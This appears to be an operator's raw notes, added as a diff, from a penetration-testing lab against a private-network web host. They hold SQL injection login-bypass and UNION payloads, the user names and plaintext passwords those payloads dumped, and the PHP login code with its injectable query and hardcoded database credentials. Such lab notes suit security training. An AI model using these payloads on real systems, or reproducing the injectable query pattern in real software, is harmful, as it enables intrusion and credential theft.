@@ -1,0 +1,83 @@
+
+
+	given ip -> attack box
+
+	4 total boxes
+
+	2 root/admin
+
+	ignore .190
+	
+	
+	
+	
+	
+	10.50.42.185
+	- 22
+	- 80
+	
+	
+	website
+	
+	admin
+	' OR '1'='1
+	- welcom Aaron
+	
+	Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1
+	Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1
+	Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+	
+	
+	= 0) { echo "welcome ", $rows['name']; } 
+	elseif($rows != 0) { while($rows = mysqli_fetch_array($result)) { echo print_r($rows); } } 
+	else { echo "Try Again"; } } 
+	
+	
+	
+	// GET through URL. PHP abuse 		
+	
+	elseif($_SERVER["REQUEST_METHOD"] == "GET") { 
+	
+	
+	//Set up DB connection 
+	
+	$con = mysqli_connect('localhost:3306','webuser','sqlpass','session') or die(mysqli_error()); 
+	
+	
+	
+	//creds
+	
+	 $username = $_GET['username']; $passwd = $_GET['passwd']; 
+	 
+	 
+	 
+	 //Query set up 
+	 
+	 $q = "select name,pass from user where name = '$username' and pass = '$passwd'"; $result = mysqli_query($con, $q); $rows = mysqli_fetch_array($result,MYSQLI_BOTH); 
+	 
+	 
+	 //DB check 
+	 
+	 if($rows != 0) { while($rows = mysqli_fetch_array($result)) { echo print_r($rows); } } else { echo "Try Again"; } } ?> 
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	anotherpassword4THEages' UNION SELECT * FROM user; #
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	----------
+	
+	OP NOTESSS
